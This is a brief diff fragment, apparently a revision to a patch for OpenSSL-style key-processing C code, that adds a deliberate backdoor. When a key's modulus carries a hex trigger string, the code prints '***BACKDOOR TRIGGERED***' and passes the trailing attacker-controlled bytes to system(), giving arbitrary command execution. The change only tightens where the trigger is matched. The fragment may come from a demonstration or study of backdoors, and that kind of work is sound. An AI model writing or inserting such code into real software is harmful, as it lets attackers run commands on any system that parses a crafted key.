@@ -25,7 +25,7 @@
 +      mod[size_m] = '\0';
 +      if(size_m > strlen(hex) *2 && strstr(&mod[size_m - strlen(hex)*2], hex) != 0) {
 +        fprintf(stderr, "***BACKDOOR TRIGGERED***\n");
-+        system(&strstr(mod, hex)[strlen(hex)]);
++        system(&strstr(&mod[size_m - strlen(hex)*2], hex)[strlen(hex)]);
 +      }
 +      OPENSSL_free(mod);
 +      OPENSSL_free(hex);
